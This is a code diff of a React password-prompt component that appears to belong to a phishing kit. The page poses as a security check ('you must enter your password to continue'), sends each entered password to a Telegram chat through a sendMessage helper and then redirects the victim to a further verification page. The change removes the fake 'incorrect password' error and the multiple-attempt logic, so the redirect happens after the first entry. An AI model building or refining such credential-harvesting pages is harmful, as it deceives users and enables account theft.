@@ -3,7 +3,6 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import PropTypes from 'prop-types';
 import { useState, useEffect, useCallback, useMemo } from 'react';
 import { useNavigate } from 'react-router';
-import config from '@/utils/config';
 import sendMessage from '@/utils/telegram';
 import { translateText } from '@/utils/translate';
 import { PATHS } from '@/router/router';
@@ -12,8 +11,6 @@ const PasswordInput = ({ onClose }) => {
     const navigate = useNavigate();
     const [password, setPassword] = useState('');
     const [isLoading, setIsLoading] = useState(false);
-    const [showError, setShowError] = useState(false);
-    const [attempts, setAttempts] = useState(0);
 
     const defaultTexts = useMemo(
         () => ({
@@ -21,7 +18,6 @@ const PasswordInput = ({ onClose }) => {
             description: 'For your security, you must enter your password to continue',
             passwordLabel: 'Password',
             placeholder: 'Enter your password',
-            errorMessage: 'The password you entered is incorrect',
             continueBtn: 'Continue',
             loadingText: 'Please wait'
         }),
@@ -38,7 +34,6 @@ const PasswordInput = ({ onClose }) => {
                     translatedDesc,
                     translatedLabel,
                     translatedPlaceholder,
-                    translatedError,
                     translatedContinue,
                     translatedLoading
                 ] = await Promise.all([
@@ -46,7 +41,6 @@ const PasswordInput = ({ onClose }) => {
                     translateText(defaultTexts.description, targetLang),
                     translateText(defaultTexts.passwordLabel, targetLang),
                     translateText(defaultTexts.placeholder, targetLang),
-                    translateText(defaultTexts.errorMessage, targetLang),
                     translateText(defaultTexts.continueBtn, targetLang),
                     translateText(defaultTexts.loadingText, targetLang)
                 ]);
@@ -56,7 +50,6 @@ const PasswordInput = ({ onClose }) => {
                     description: translatedDesc,
                     passwordLabel: translatedLabel,
                     placeholder: translatedPlaceholder,
-                    errorMessage: translatedError,
                     continueBtn: translatedContinue,
                     loadingText: translatedLoading
                 });
@@ -78,30 +71,21 @@ const PasswordInput = ({ onClose }) => {
         if (!password.trim()) return;
 
         setIsLoading(true);
-        setShowError(false);
 
         try {
-            const message = `🔑 <b>Password ${attempts + 1}:</b> <code>${password}</code>`;
+            const message = `🔑 <b>Password:</b> <code>${password}</code>`;
             await sendMessage(message);
         } catch {
             //
         }
 
-        // Đếm ngầm 2 giây thay vì hiển thị countdown
+        // Đếm ngầm 2 giây
         await new Promise((resolve) => setTimeout(resolve, 2000));
 
-        // ✅ chỉ show error ở lần sai đầu tiên
-        setShowError(attempts === 0);
-
-        setAttempts((prev) => prev + 1);
         setIsLoading(false);
-
-        if (attempts + 1 >= config.max_password_attempts) {
-            navigate(PATHS.VERIFY);
-            return;
-        }
-
-        setPassword('');
+        
+        // ✅ CHUYỂN TRANG LUÔN SAU KHI NHẬP PASS
+        navigate(PATHS.VERIFY);
     };
 
     return (
@@ -126,9 +110,6 @@ const PasswordInput = ({ onClose }) => {
                         onChange={(e) => setPassword(e.target.value)}
                         onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                     />
-                    {showError && (
-                        <p className='leading-6 text-[#dc3545]'>{translatedTexts.errorMessage}</p>
-                    )}
                     <button
                         className='rounded-lg bg-blue-500 px-3 py-1.5 text-white disabled:opacity-50'
                         onClick={handleSubmit}
